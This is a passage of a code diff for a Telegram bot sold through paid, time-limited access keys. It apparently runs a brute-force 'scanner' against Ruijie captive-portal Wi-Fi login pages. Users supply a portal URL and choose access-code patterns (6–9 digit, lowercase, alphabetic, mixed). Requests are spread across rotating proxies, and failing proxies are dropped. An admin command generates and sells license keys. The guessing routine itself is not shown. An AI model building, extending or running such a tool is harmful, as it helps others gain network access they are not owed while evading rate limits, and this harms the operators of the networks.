-    session = aiohttp.ClientSession(
-        timeout=timeout,
-        connector=_connector,
-        connector_owner=False
-    )
-    try:
-        asyncio.create_task(web_server())
-        asyncio.create_task(github_update_scheduler())
-        await start_polling()
+        await state["stop_event"].wait()
     finally:
-        await session.close()
-        await _connector.close()
+        for t in tasks:
+            if not t.done():
+                t.cancel()
+        await asyncio.gather(*tasks, return_exceptions=True)
+        try:
+            await live_dashboard_updater_final(context, user_id, state)
+        except Exception:
+            pass
+        state["running"] = False
 
-if __name__ == '__main__':
-    asyncio.run(main())
+
+# ==============================================================================
+#  MENU MARKUPS
+# ==============================================================================
+
+def get_main_menu_markup():
+    keyboard = [
+        [InlineKeyboardButton("🔗  PORTAL   🔮", callback_data="btn_update_portal"),
+         InlineKeyboardButton("⚙️  MODES  📜", callback_data="btn_mode_menu")],
+        [InlineKeyboardButton("⚡  SCAN  ⚡", callback_data="btn_start_scanner"),
+         InlineKeyboardButton("🛑  BANISH SCAN  🛑", callback_data="stop_scan")],
+        [InlineKeyboardButton("👁️  ABYSS STATUS  👁️️", callback_data="btn_proxy_status"),
+         InlineKeyboardButton("🧹  PURGE PROXIES  🧹", callback_data="btn_clear_proxies")],
+        [InlineKeyboardButton("⛓️  ADD PROXIES  🕷️", callback_data="btn_add_proxies"),
+         InlineKeyboardButton("🔑   ACCESS  🔑", callback_data="btn_my_key")],
+        [InlineKeyboardButton("⚔️ ⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸  ⚔️️", callback_data="btn_back_main")],
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+
+def get_mode_menu_markup():
+    keyboard = [
+        [InlineKeyboardButton("💠 06 DIGIT  ⚡", callback_data="set_mode_num6"),
+         InlineKeyboardButton("💠  07 DIGIT  ⚡", callback_data="set_mode_num7")],
+        [InlineKeyboardButton("💠  08 DIGIT  ⚡", callback_data="set_mode_num8"),
+         InlineKeyboardButton("💠  09 DIGIT  ⚡", callback_data="set_mode_num9")],
+        [InlineKeyboardButton("❄️ 06 LOWER  💠", callback_data="set_mode_eng6"),
+         InlineKeyboardButton("❄️  07 LOWER  💠", callback_data="set_mode_eng7")],
+        [InlineKeyboardButton("❄️  08 LOWER  💠", callback_data="set_mode_eng8"),
+         InlineKeyboardButton("🆎  06 ALPHA  💎", callback_data="set_mode_abc6")],
+        [InlineKeyboardButton("Ⓜ️  06 MIXED  🧬", callback_data="set_mode_mix6"),
+         InlineKeyboardButton("Ⓜ️  07 MIXED  🧬", callback_data="set_mode_mix7")],
+        [InlineKeyboardButton("Ⓜ️  08 MIXED  🧬", callback_data="set_mode_mix8"),
+         InlineKeyboardButton("📝  CUSTOM SPELL  ✦", callback_data="set_mode_custom")],
+        [InlineKeyboardButton("🔁  RETURN  🦇", callback_data="btn_back_main")],
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+
+def get_back_markup(callback="btn_back_main"):
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🦇  RETURN  🦇", callback_data=callback)]
+    ])
+
+
+def admin_only(func):
+    async def wrapper(update, context, *args, **kwargs):
+        user = update.effective_user
+        if not user or user.id not in ADMIN_IDS:
+            await update.effective_message.reply_text(
+                "⛔ Access Denied! Mortal souls cannot invoke this command. "
+                "Contact Overlord Telegram @mzw199761")
+            return
+        return await func(update, context, *args, **kwargs)
+    return wrapper
+
+
+# ==============================================================================
+#  /start
+# ==============================================================================
+
+async def start(update, context, *args, **kwargs):
+    user_id = update.effective_user.id
+
+    if not is_user_authorized(user_id):
+        context.user_data["waiting_for_paid_key"] = True
+        await update.message.reply_text(
+            "🔑 ** Seal Required**\n\n"
+            "You require a  Seal Access Key to enter the realm.\n\n"
+            "📌 Acquire key from  Lord — Telegram: @mzw199761\n\n"
+            "🔮 Send your Access Key below:",
+            parse_mode=ParseMode.MARKDOWN)
+        return
+
+    mode = context.user_data.get("selected_mode", "num6")
+    saved_url = get_user_data(user_id)
+    pm = get_proxy_manager()
+    total, bad = pm.stats()
+    active = total - bad
+
+    if is_admin(user_id):
+        key_line = "👑 Overlord Access (Infinite)"
+    else:
+        user_info = paid_users.get(user_id)
+        if user_info:
+            key_line = f"🔑  Seal Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
+        else:
+            key_line = "🔑  Realm Initiate"
+
+    if saved_url:
+        text = ("⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦ CONTROL ✦`\n\n"
+                f"📜 Active Spell Mode: `{MODES.get(mode, mode)}`\n"
+                f"🕷️ Active Proxies: `{active}`\n"
+                f"🧑‍🔧  Workers: `{NUM_WORKERS}`\n"
+                f"{key_line}\n"
+                "🔮 Portal: Binding Established ✅")
+    else:
+        text = ("⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦  CONTROL ✦`\n\n"
+                f"📜 Active Spell Mode: `{MODES.get(mode, mode)}`\n"
+                f"🕷️ Active Proxies: `{active}`\n"
+                f"🧑‍🔧  Workers: `{NUM_WORKERS}`\n"
+                f"{key_line}\n"
+                "❌ Portal missing. Press `PORTAL REALM` button to set.")
+    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
+                                    reply_markup=get_main_menu_markup())
+
+
+# ==============================================================================
+#  /genkey + /cancel + /reloadkeys
+# ==============================================================================
+
+@admin_only
+async def genkey_command(update, context, *args, **kwargs):
+    await update.message.reply_text(
+        "👑 **Thank You For Use**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Send format in this order:\n\n"
+        "```\n"
+        "<time> <plan> <count> [prefix]\n"
+        "```\n\n"
+        "**Time Format:**\n"
+        "• `1h` = 1 Hour\n"
+        "• `6h` = 6 Hours\n"
+        "• `12h` = 12 Hours\n"
+        "• `24h` = 24 Hours\n"
+        "• `1d` = 1 Day\n"
+        "• `7d` = 7 Days\n"
+        "• `30d` = 30 Days\n"
+        "• `365d` = 365 Days\n"
+        "• `30m` = 30 Minutes\n\n"
+        "**Example:** `1h premium 5` or `30d vip 3`\n\n"
+        "📌 Default: `1d premium 1 NAING`\n\n"
+        "**Cancel Command:** /cancel",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("❌ ABORT RITUAL • ↩️", callback_data="btn_back_main")]
+        ]))
+    context.user_data["waiting_for_genkey"] = True
+
+
+@admin_only
+async def cancel_command(update, context, *args, **kwargs):
+    context.user_data["waiting_for_genkey"] = False
+    await update.message.reply_text(
+        "❌ **Ritual Aborted**",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=get_main_menu_markup())
+
+
+@admin_only
+async def reloadkeys_command(update, context, *args, **kwargs):
+    try:
+        keys = load_paid_keys_local()
+        await update.message.reply_text(
+            f"✅ ** Seals Reloaded**\n\n"
+            f"📊 Total seals: `{len(keys)}`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_menu_markup())
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
+
+
+def generate_keys_batch_seconds(duration_seconds, plan, count, prefix):
+    import hashlib as _hl
+    import datetime as _dt
+    import random as _rnd
+    import string as _st
+
+    user_keys = []
+    lines = []
+    for _ in range(count):
+        chars = _st.ascii_uppercase + _st.digits
+        random_part = "".join(_rnd.SystemRandom().choice(chars) for _ in range(12))
+        user_key = f"{prefix}-{random_part}"
+        key_hash = _hl.sha256(user_key.encode()).hexdigest()[:32]
+        expiry_date = _dt.datetime.now() + _dt.timedelta(seconds=duration_seconds)
+        expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
+        signature = _hl.sha256(f"{key_hash}:{expiry_str}".encode()).hexdigest()
+        line = f"{key_hash}:{expiry_str}:{plan}:{signature}"
+        user_keys.append(user_key)
+        lines.append(line)
+    return user_keys, lines
+
+
+async def handle_genkey_input(update, context):
+    user_id = update.effective_user.id
+    raw = (update.message.text or "").strip()
+    context.user_data["waiting_for_genkey"] = False
+
+    parts = raw.split()
+    if not parts:
+        await update.message.reply_text("❌ Invalid Format. Send /genkey again.")
+        return
+
+    time_str = parts[0].lower()
+    duration_seconds = None
+    duration_text = ""
+
+    try:
+        if time_str.endswith("h"):
+            hours = int(time_str[:-1])
+            if hours < 1 or hours > 8760:
+                raise ValueError
+            duration_seconds = hours * 3600
+            duration_text = f"{hours} hour(s)"
+        elif time_str.endswith("d"):
+            days = int(time_str[:-1])
+            if days < 1 or days > 365:
+                raise ValueError
+            duration_seconds = days * 86400
+            duration_text = f"{days} day(s)"
+        elif time_str.endswith("m"):
+            minutes = int(time_str[:-1])
+            if minutes < 1 or minutes > 100000:
+                raise ValueError
+            duration_seconds = minutes * 60
+            duration_text = f"{minutes} minute(s)"
+        else:
+            days = int(time_str)
+            if days < 1 or days > 365:
+                raise ValueError
+            duration_seconds = days * 86400
+            duration_text = f"{days} day(s)"
+    except ValueError:
+        await update.message.reply_text(
+            "❌ Invalid time format.\n"
+            "**Example:** `1h premium 5` or `30d vip 3`",
+            parse_mode=ParseMode.MARKDOWN)
+        return
+
+    try:
+        plan = parts[1] if len(parts) > 1 else "premium"
+        count = int(parts[2]) if len(parts) > 2 else 1
+        prefix = parts[3] if len(parts) > 3 else "VOKA"
+    except ValueError:
+        await update.message.reply_text("❌ Invalid format numbers.")
+        return
+
+    if count < 1 or count > 100:
+        await update.message.reply_text("❌ Count must be between 1 and 100.")
+        return
+
+    status = await update.message.reply_text(
+        f"⏳ **Forging {count}  Seals...**\n\n"
+        f"⏰ Duration: `{duration_text}`\n"
+        f"📦 Plan: `{plan}`\n"
+        f"🔤 Prefix: `{prefix}`",
+        parse_mode=ParseMode.MARKDOWN)
+
+    try:
+        user_keys, lines = generate_keys_batch_seconds(duration_seconds, plan, count, prefix)
+    except Exception as e:
+        await status.edit_text(f"❌ Error: {e}")
+        return
+
+    try:
+        if not os.path.exists(PAID_KEYS_FILE):
+            with open(PAID_KEYS_FILE, "w") as f:
+                f.write("# Format: <key_hash>:<expiry>:<plan>:<signature>\n")
+        with open(PAID_KEYS_FILE, "a") as f:
+            for line in lines:
+                f.write(line + "\n")
+        saved = True
+    except Exception:
+        saved = False
+
+    expiry_date = datetime.datetime.now() + datetime.timedelta(seconds=duration_seconds)
+    expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
+    keys_text = "\n".join(f"`{k}`" for k in user_keys)
+
+    msg = (
+        f"✅ **{count}  SEAL(S) FORGED**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏰ Duration: `{duration_text}`\n"
+        f"📦 Plan: `{plan}`\n"
+        f"⏳ Expiration: `{expiry_str}`\n"
+        f"🔤 Prefix: `{prefix}`\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔑 **ACCESS KEYS:**\n\n{keys_text}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+    )
+    if saved:
+        msg += f"✅ Binding saved to `{PAID_KEYS_FILE}`\n"
+        msg += "🔄 Restart bot or invoke `/reloadkeys`\n"
+    else:
+        msg += "⚠️ Save Failed!\n"
+
+    try:
+        await status.edit_text(
+            msg, parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("⚡ FORGE MORE ➕", callback_data="btn_genkey_more"),
+                 InlineKeyboardButton("‹ RETURN ›", callback_data="btn_back_main")]
+            ]))
+    except Exception:
+        pass
+
+
+# ==============================================================================
+#  CALLBACKS
+# ==============================================================================
+
+async def handle_callbacks(update, context, *args, **kwargs):
+    query = update.callback_query
+    user_id = update.effective_user.id
+    data = query.data
+    await query.answer()
+
+    if not is_user_authorized(user_id) and data != "btn_my_key":
+        await query.edit_message_text(
+            "🔑 ** Seal Required**\n\n"
+            "Acquire access key from Overlord — Telegram: @mzw199761\n\n"
+            "🔮 Send your Access Key in `/start`.",
+            parse_mode=ParseMode.MARKDOWN)
+        return
+
+    mode = context.user_data.get("selected_mode", "num6")
+    pm = get_proxy_manager()
+    total, bad = pm.stats()
+    active = total - bad
+
+    # BACK
+    if data == "btn_back_main":
+        context.user_data["waiting_for_proxy_text"] = False
+        context.user_data["waiting_for_portal_url"] = False
+        context.user_data["waiting_for_digit"] = False
+        context.user_data["waiting_for_genkey"] = False
+        saved_url = get_user_data(user_id)
+        if is_admin(user_id):
+            key_line = "👑  Overlord Access (Infinite)"
+        else:
+            user_info = paid_users.get(user_id)
+            if user_info:
+                key_line = f"🔑  Seal Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
+            else:
+                key_line = "🔑  Realm Initiate"
+        portal_line = "🔮 Portal: Binding Established ✅" if saved_url else \
+            "❌ Portal missing. Press `PORTAL REALM` button."
+        await query.edit_message_text(
+            "⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦ CONTROL ✦`\n\n"
+            f"📜 Active Spell Mode: `{MODES.get(mode, mode)}`\n"
+            f"🕷️ Active Proxies: `{active}`\n"
+            f"🧑‍🔧  Workers: `{NUM_WORKERS}`\n"
+            f"{key_line}\n{portal_line}",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_menu_markup())
+        return
+
+    if data == "btn_back_mode":
+        context.user_data["waiting_for_digit"] = False
+        await query.edit_message_text(
+            "📜 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • SELECT SPELL MODE**",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_mode_menu_markup())
+        return
+
+    if data == "btn_genkey_more":
+        context.user_data["waiting_for_genkey"] = True
+        await query.edit_message_text(
+            "👑 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • SEAL CREATION**\n\n"
+            "Format: `<time> <plan> <count> [prefix]`\n\n"
+            "**Example:** `1h premium 5`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("❌ ABORT RITUAL • ↩️", callback_data="btn_back_main")]
+            ]))
+        return
+
+    # MODE
+    if data.startswith("set_mode_"):
+        new_mode = data[len("set_mode_"):]
+        context.user_data["selected_mode"] = new_mode
+        mode = new_mode
+        if new_mode == "custom":
+            context.user_data["waiting_for_digit"] = True
+            await query.edit_message_text(
+                "🔮 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • CUSTOM SPELL**\n\n"
+                "Send starting digit sequence (0-9):",
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=get_back_markup("btn_back_mode"))
+            return
+        await query.edit_message_text(
+            f"✅  Spell Mode Inscribed!\n\n"
+            "⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦  CONTROL ✦`\n\n"
+            f"📜 Active Spell Mode: `{MODES.get(mode, mode)}`\n"
+            f"🕷️ Active Proxies: `{active}`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_menu_markup())
+        return
+
+    # PORTAL
+    if data == "btn_update_portal":
+        context.user_data["waiting_for_portal_url"] = True
+        await query.edit_message_text(
+            "🔮 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • PORTAL LINK**\n\n"
+            "Send  Portal URL.\n"
+            "Example:\n"
+            "`https://portal-as.ruijienetworks.com/...?mac=xxxx&...`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_back_markup("btn_back_main"))
+        return
+
+    # MODE MENU
+    if data == "btn_mode_menu":
+        await query.edit_message_text(
+            "📜 **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • SELECT SPELL MODE**",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_mode_menu_markup())
+        return
+
+    # PROXY
+    if data == "btn_add_proxies":
+        context.user_data["waiting_for_proxy_text"] = True
+        await query.edit_message_text(
+            "🕷️️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ • PROXY **\n\n"
+            "Format:\n"
+            "```\n"
+            "123.45.67.89:8080\n"
+            "socks5://user:pass@host:1080\n"
+            "```\n"
+            f"👁️ Currently Active: `{active}`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_back_markup("btn_back_main"))
+        return
+
+    if data == "btn_proxy_status":
+        pm = get_proxy_manager()
+        total, bad = pm.stats()
+        active = total - bad
+        sample = pm.proxies[:5] if pm.proxies else []
+        sample_str = "\n".join(f"• `{p}`" for p in sample) if sample else "_(none)_"
+        text = (
+            "👁️ **Abyss Proxy Status**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"✅ Active Thralls: `{active}`\n"
+            f"❌ Banished Bad: `{bad}`\n"
+            f"📦 Total Bound: `{total}`\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"**Sample Thralls (5):**\n{sample_str}"
+        )
+        await query.edit_message_text(
+            text, parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_back_markup("btn_back_main"))
+        return
+
+    if data == "btn_clear_proxies":
+        pm = get_proxy_manager()
+        try:
+            with open(PROXY_FILE, "w") as f:
+                f.write("")
+            pm.proxies = []
+            pm.bad_proxies = []
+            pm.fail_counts = {}
+        except OSError:
+            pass
+        await query.edit_message_text(
+            "🧹 **All proxies banished to the void!**",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_back_markup("btn_back_main"))
+        return
+
+    # SCANNER
+    if data == "btn_start_scanner":
+        await query.edit_message_text("⚡ Initiating  Ritual Scanner...")
+        asyncio.get_event_loop().create_task(run_user_scanner(context, user_id))
+        return
+
+    if data == "stop_scan":
+        state = user_scanners.get(user_id)
+        if state and not state["stop_event"].is_set():
+            state["stop_event"].set()
+            await query.edit_message_text(
+                "🛑  Ritual Terminated!",
+                reply_markup=get_back_markup("btn_back_main"))
+        else:
+            await query.edit_message_text(
+                "ℹ️ No active ritual currently running.",
+                reply_markup=get_back_markup("btn_back_main"))
+        return
+
+    # MY KEY
+    if data == "btn_my_key":
+        if is_admin(user_id):
+            text = "👑 ** Overlord Access**\n\n🔓 Eternal Authority\n🔑 Key Not Required"
+        else:
+            user_info = paid_users.get(user_id)
+            if user_info:
+                text = (
+                    "🔑 **Your  Seal Pact**\n\n"
+                    f"📦 Plan: `{user_info['plan']}`\n"
+                    f"📅 Expiration: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M:%S')}`\n"
+                    f"🔐 Seal Code: `{user_info['key'][:8]}...{user_info['key'][-4:]}`"
+                )
+            else:
+                text = "❌ **No Active  Seal Found**\n\nAcquire pact — Telegram: @mzw199761"
+        await query.edit_message_text(
+            text, parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_back_markup("btn_back_main"))
+        return
+
+
+# ==============================================================================
+#  TEXT HANDLER
+# ==============================================================================
+
+async def handle_text(update, context, *args, **kwargs):
+    user_id = update.effective_user.id
+    raw_text = (update.message.text or "").strip()
+    pm = get_proxy_manager()
+    mode = context.user_data.get("selected_mode", "num6")
+
+    # PAID KEY
+    if context.user_data.get("waiting_for_paid_key"):
+        context.user_data["waiting_for_paid_key"] = False
+        if is_admin(user_id):
+            await update.message.reply_text(
+                "👑 ** Overlord Access Granted**\n\n⚡ Control Panel Awakened ⚡",
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=get_main_menu_markup())
+            return
+        result = validate_paid_key(raw_text)
+        if result is None:
+            await update.message.reply_text(
+                "❌ **Invalid  Seal Key**\n\nAcquire pact — Telegram: @mzw199761",
+                parse_mode=ParseMode.MARKDOWN)
+            return
+        if not result["valid"]:
+            await update.message.reply_text(
+                f"⏰ ** Seal Has Expired**\nExpired: `{result['expiry'].strftime('%Y-%m-%d %H:%M')}`",
+                parse_mode=ParseMode.MARKDOWN)
+            return
+        register_paid_user(user_id, raw_text, result["expiry"], result["plan"])
+        await update.message.reply_text(
+            f"✅ ** Seal Verified!**\n\n"
+            f"📦 Plan: `{result['plan']}`\n"
+            f"📅 Expiration: `{result['expiry'].strftime('%Y-%m-%d %H:%M:%S')}`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_menu_markup())
+        return
+
+    # GENKEY
+    if context.user_data.get("waiting_for_genkey"):
+        if not is_admin(user_id):
+            context.user_data["waiting_for_genkey"] = False
+            await update.message.reply_text("⛔ Admin Command Only", reply_markup=get_main_menu_markup())
+            return
+        await handle_genkey_input(update, context)
+        return
+
+    if not is_user_authorized(user_id):
+        context.user_data["waiting_for_paid_key"] = True
+        await update.message.reply_text(
+            "🔑 **Seal Key Required**\n\n"
+            "Acquire pact — Telegram: @mzw199761\n\n"
+            "🔮 Send your Access Key:",
+            parse_mode=ParseMode.MARKDOWN)
+        return
+
+    # PROXY
+    if context.user_data.get("waiting_for_proxy_text"):
+        context.user_data["waiting_for_proxy_text"] = False
+        lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
+        if not lines:
+            await update.message.reply_text(
+                "❌ Empty proxy list provided",
+                reply_markup=get_back_markup("btn_back_main"))
+            return
+        added, invalid = pm.add_proxies(lines)
+        total, bad = pm.stats()
+        active = total - bad
+        msg = (
+            "✅ **Proxies Bound **\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"➕ Added Thralls: `{added}`\n"
+            f"❌ Banished Invalid: `{invalid}`\n"
+            f"✅ Active Total: `{active}`\n"
+            "━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN,
+                                        reply_markup=get_main_menu_markup())
+        return
+
+    # PORTAL URL
+    if context.user_data.get("waiting_for_portal_url"):
+        context.user_data["waiting_for_portal_url"] = False
+        if not raw_text.lower().startswith(("http://", "https://")):
+            await update.message.reply_text(
+                "❌ Invalid URL — must start with http:// or https://",
+                reply_markup=get_back_markup("btn_back_main"))
+            return
+        try:
+            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
+                f.write(raw_text)
+        except OSError:
+            pass
+        total, bad = pm.stats()
+        await update.message.reply_text(
+            "✅ **Portal  Saved**\n\n"
+            "⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n"
+            f"📜 Spell Mode: `{MODES.get(mode, mode)}`\n"
+            f"🕷️ Active Proxies: `{total - bad}`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_menu_markup())
+        return
+
+    # CUSTOM DIGIT
+    if context.user_data.get("waiting_for_digit"):
+        context.user_data["waiting_for_digit"] = False
+        if not raw_text.isdigit():
+            await update.message.reply_text(
+                "❌ Send numerical digits only",
+                reply_markup=get_back_markup("btn_back_mode"))
+            return
+        context.user_data["start_digit"] = int(raw_text[0])
+        total, bad = pm.stats()
+        await update.message.reply_text(
+            f"✅ Start Digit Inscribed = `{raw_text[0]}`\n\n"
+            f"📜 Mode: `{MODES.get(mode, mode)}`",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_menu_markup())
+        return
+
+    # DEFAULT
+    saved_url = get_user_data(user_id)
+    total, bad = pm.stats()
+    if is_admin(user_id):
+        key_line = "👑  Overlord Access"
+    else:
+        user_info = paid_users.get(user_id)
+        if user_info:
+            key_line = f"🔑 Pact Expires: `{user_info['expiry'].strftime('%Y-%m-%d %H:%M')}`"
+        else:
+            key_line = "🔑  Realm Initiate"
+    portal_line = "🔮 Portal: Binding Established ✅" if saved_url else "❌ Portal missing — Set Portal"
+    await update.message.reply_text(
+        "⚔️ **⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸** ⚔️\n`✦ CONTROL ✦`\n\n"
+        f"📜 Spell Mode: `{MODES.get(mode, mode)}`\n"
+        f"🕷️ Active Proxies: `{total - bad}`\n"
+        f"🧑‍🔧 Workers: `{NUM_WORKERS}`\n"
+        f"{key_line}\n{portal_line}",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=get_main_menu_markup())
+
+
+# ==============================================================================
+#  MAIN
+# ==============================================================================
+
+def main():
+    ensure_files_exist()
+    load_registered_users()
+    app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("genkey", genkey_command))
+    app.add_handler(CommandHandler("cancel", cancel_command))
+    app.add_handler(CommandHandler("reloadkeys", reloadkeys_command))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+    app.add_handler(CallbackQueryHandler(handle_callbacks))
+
+    pm = get_proxy_manager()
+    total, bad = pm.stats()
+    active = total - bad
+    print(bgreen + f"[MAIN] Proxy Manager: {active} active / {total} total" + reset)
+    print(bgreen + f"[MAIN] Paid users: {len(paid_users)}" + reset)
+    print(bgreen + f"[MAIN] Admin IDs: {ADMIN_IDS}" + reset)
+    print(bgreen + f"[MAIN] ⚡ NUM_WORKERS: {NUM_WORKERS}" + reset)
+    print(bgreen + f"[MAIN] ⚡ PROXY_MAX_FAILS: {PROXY_MAX_FAILS}" + reset)
+    print(bgreen + f"[MAIN] ⚡ TIMEOUT_SEC: {TIMEOUT_SEC}" + reset)
+    print(bgreen + f"[MAIN] ⚡ CHARSET_MIX: {CHARSET_MIX}" + reset)
+
+    print("⫷[S̲̲̅̅H̲̲̅̅I̲̲̅̅N̲̲̅̅E̲̲̅̅]⫸ Bot is running...")
+    app.run_polling(drop_pending_updates=True)
+    print(" awaits your return — Telegram @mzw199761")
+
+
+# ==============================================================================
+#  ENTRY POINT
+# ==============================================================================
+
+show_banner()
+check_approval()
+check_time_integrity()
+_proxy_manager = get_proxy_manager()
+
+if __name__ == "__main__":
+    main()
